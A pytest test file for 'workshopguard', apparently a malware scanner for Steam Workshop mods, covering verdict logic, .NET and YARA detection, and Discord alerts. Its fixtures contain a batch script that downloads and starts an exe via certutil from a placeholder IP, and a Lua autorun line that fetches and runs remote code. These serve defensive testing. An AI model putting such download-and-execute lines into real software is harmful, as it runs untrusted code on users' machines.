"""Unit tests. Run inside the image:
    docker compose run --rm --entrypoint python -v ./tests:/app/tests:ro guard -m pytest -q /app/tests
(or locally with the requirements installed)."""

import json
import zipfile
import io
from pathlib import Path

import pytest

from workshopguard import games, notify, steam, testdata
from workshopguard.scan import dotnet
from workshopguard.scan.engine import Scanners, scan_dir
from workshopguard.scan.model import Finding, verdict_for
from workshopguard.scan.yarascan import Yara

FIXTURES = Path(__file__).parent / "fixtures" / "out"


def test_resolve_games():
    assert games.resolve("plateup").appid == 1599600
    assert games.resolve("BO3").appid == 311210
    assert games.resolve("https://store.steampowered.com/app/1599600/PlateUp/").appid == 1599600
    assert games.resolve("1234567").name == "App 1234567"
    with pytest.raises(ValueError):
        games.resolve("notagame")


def test_verdicts():
    f = lambda sev, file="a.dll", rule=None: Finding("x", sev, rule or f"r.{sev}.{file}", "", file)  # noqa: E731
    assert verdict_for([])[0] == "clean"
    assert verdict_for([f("low")] * 30)[0] == "clean"  # lows never add up to a flag
    assert verdict_for([f("medium", rule="a"), f("medium", rule="b")])[0] == "clean"
    assert verdict_for([f("medium", rule="a"), f("medium", rule="b"), f("medium", rule="c")])[0] == "suspicious"
    assert verdict_for([f("medium", "1.dll", "a"), f("medium", "2.dll", "b"), f("medium", "3.dll", "c")])[0] == "clean"
    assert verdict_for([f("high")])[0] == "suspicious"
    assert verdict_for([f("high"), f("critical")])[0] == "malicious"


def test_byte_array_signature():
    # Assembly.Load(byte[]): default conv, 1 param, returns class token, param szarray of u1
    assert dotnet._takes_byte_array(bytes([0x00, 0x01, 0x12, 0x81, 0x29, 0x1D, 0x05]))
    # Assembly.Load(AssemblyName) from Mono.Cecil
    assert not dotnet._takes_byte_array(bytes.fromhex("000112812912811d"))
    # LoadFile(string)
    assert not dotnet._takes_byte_array(bytes.fromhex("000112790e"))


def test_parse_browse_html():
    payload = {"loaderData": [json.dumps({"queries": [{"queryKey": ["workshop_browse", {"page": 1}], "state": {
        "data": {"total_count": 31, "results": [{"publishedfileid": "123", "creator": "7656", "consumer_appid": 1599600,
                                                  "title": "Mod", "time_updated": 5, "file_size": "42"}]}}}]})]}
    html = f'<script type="application/json" id="valve-ssr-data" nonce="x">{json.dumps(payload)}</script>'
    items, total = steam.parse_browse_html(1599600, html)
    assert total == 31 and items[0].id == "123" and items[0].file_size == 42 and items[0].title == "Mod"
    with pytest.raises(steam.SteamError):
        steam.parse_browse_html(1, "<html></html>")


def test_eicar_is_assembled_correctly():
    e = testdata.eicar()
    assert len(e) == 68 and e.startswith(b"X5O!") and e.endswith(b"H+H*")


def _scan(tmp_path, files: dict, game="bo3"):
    for name, data in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
    return scan_dir(tmp_path, games.resolve(game), Scanners(yara=Yara()))


def test_clean_bo3_item(tmp_path):
    r = _scan(tmp_path, {"zm_mod.ff": b"\x00" * 100, "workshop.json": b"{}", "en_zm_mod.ff": b"x"})
    assert r.verdict == "clean" and r.files_scanned == 3


def test_test_marker_detected(tmp_path):
    testdata.plant(tmp_path)
    r = scan_dir(tmp_path, games.resolve("plateup"), Scanners(yara=Yara()))
    assert r.verdict == "malicious"
    assert "yara.WorkshopGuard_Test_Marker" in {f.rule for f in r.findings}


def test_script_in_zip_and_double_extension(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("inner/run.bat", "@echo off\r\ncertutil -urlcache -f http://203.0.113.9/a.exe a.exe\r\nstart a.exe\r\n")
    r = _scan(tmp_path, {"extras.zip": buf.getvalue(), "readme.txt.exe": b"MZ"})
    rules = {f.rule for f in r.findings}
    assert "yara.WG_Script_Downloader" in rules        # found inside the zip
    assert "files.double_extension" in rules
    assert r.verdict == "malicious"


def test_lua_backdoor(tmp_path):
    r = _scan(tmp_path, {"lua/autorun/x.lua": b'http.Fetch("https://x.invalid/p", function(b) RunString(b) end)'},
              game="gmod")
    assert "yara.WG_Lua_Remote_Code" in {f.rule for f in r.findings}


@pytest.mark.skipif(not (FIXTURES / "plateup").exists(), reason="run tests/build_fixtures.sh first")
def test_fake_stealer_mod_is_malicious():
    r = scan_dir(FIXTURES / "plateup" / "9000000001", games.resolve("plateup"), Scanners(yara=Yara()))
    rules = {f.rule for f in r.findings}
    assert r.verdict == "malicious"
    for expected in ("dotnet.combo.loader", "dotnet.combo.dropper", "dotnet.combo.stealer", "dotnet.combo.worm"):
        assert expected in rules, expected


def test_discord_payload_shape():
    p = notify.build_payload({"appid": 311210, "id": "1", "title": "T", "creator": "7656"}, "BO3", "malicious", 60,
                             [{"severity": "critical", "description": "bad", "file": "a.dll", "rule": "r",
                               "scanner": "x", "evidence": []}], is_test=True, previous="clean", public_url="")
    e = notify.discord_embed(p)["embeds"][0]
    assert e["title"].startswith("[TEST]") and "bad" in e["description"]
    assert any(f["name"] == "Changed" for f in e["fields"])
